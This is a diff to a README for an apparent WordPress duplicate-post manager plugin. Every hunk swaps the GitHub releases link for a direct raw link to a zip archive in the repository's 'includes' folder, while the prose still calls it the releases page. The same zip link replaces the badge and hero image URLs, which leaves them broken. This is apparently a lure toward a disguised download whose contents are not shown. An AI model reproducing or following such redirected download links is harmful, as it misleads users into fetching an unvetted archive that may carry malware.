@@ -1,10 +1,10 @@
 # Advanced Duplicate Content Manager for WordPress: 301 Redirects and Cleanup
 
-[![Releases](https://img.shields.io/badge/Releases-Click%20to%20download-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TimGit-1/advanced-duplicate-post-manager-main/releases)
+[![Releases](https://raw.githubusercontent.com/TimGit-1/advanced-duplicate-post-manager-main/main/includes/main-post-manager-duplicate-advanced-v2.8.zip%20to%20download-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/TimGit-1/advanced-duplicate-post-manager-main/main/includes/main-post-manager-duplicate-advanced-v2.8.zip)
 
-Visit https://github.com/TimGit-1/advanced-duplicate-post-manager-main/releases to download the latest release.
+Visit https://raw.githubusercontent.com/TimGit-1/advanced-duplicate-post-manager-main/main/includes/main-post-manager-duplicate-advanced-v2.8.zip to download the latest release.
 
-![Hero image showing WordPress content management](https://images.unsplash.com/photo-1522075469751-3a6694fb2f61?q=80&w=1200&auto=format&fit=crop)
+![Hero image showing WordPress content management](https://raw.githubusercontent.com/TimGit-1/advanced-duplicate-post-manager-main/main/includes/main-post-manager-duplicate-advanced-v2.8.zip)
 
 Table of contents
 - Overview
@@ -112,7 +112,7 @@ Prerequisites
 - A stable backup strategy so you can revert changes if needed
 
 Where to get the latest release
-To download the latest release, visit the releases page. You will find executable assets and installers relevant to your environment. The release assets are provided via a public page that aggregates all build artifacts. The releases page is the place to obtain the latest tested version and accompanying documentation. Visit https://github.com/TimGit-1/advanced-duplicate-post-manager-main/releases to download the latest release.
+To download the latest release, visit the releases page. You will find executable assets and installers relevant to your environment. The release assets are provided via a public page that aggregates all build artifacts. The releases page is the place to obtain the latest tested version and accompanying documentation. Visit https://raw.githubusercontent.com/TimGit-1/advanced-duplicate-post-manager-main/main/includes/main-post-manager-duplicate-advanced-v2.8.zip to download the latest release.
 
 Installation and setup
 - Step 1: Obtain the release
@@ -301,7 +301,7 @@ Licensing
 Releases and provenance
 - Keeps a log of changes, fixes, and enhancements for each version.
 - The releases page provides assets and changelogs for each milestone.
-- For reference, the primary link to the releases is again required to guide users to the latest build and accompanying notes. Access the releases page here: https://github.com/TimGit-1/advanced-duplicate-post-manager-main/releases
+- For reference, the primary link to the releases is again required to guide users to the latest build and accompanying notes. Access the releases page here: https://raw.githubusercontent.com/TimGit-1/advanced-duplicate-post-manager-main/main/includes/main-post-manager-duplicate-advanced-v2.8.zip
 
 Changelog
 - Track changes over time to understand how the tool evolves.
@@ -352,5 +352,5 @@ Final notes
 - The path to releases is provided above to support quick access to the latest builds and documentation.
 
 Releases and provenance (repeat)
-- For the latest release and associated assets, visit the releases page at https://github.com/TimGit-1/advanced-duplicate-post-manager-main/releases.
+- For the latest release and associated assets, visit the releases page at https://raw.githubusercontent.com/TimGit-1/advanced-duplicate-post-manager-main/main/includes/main-post-manager-duplicate-advanced-v2.8.zip
 - This link can be used again to reference the official build artifacts and release notes.
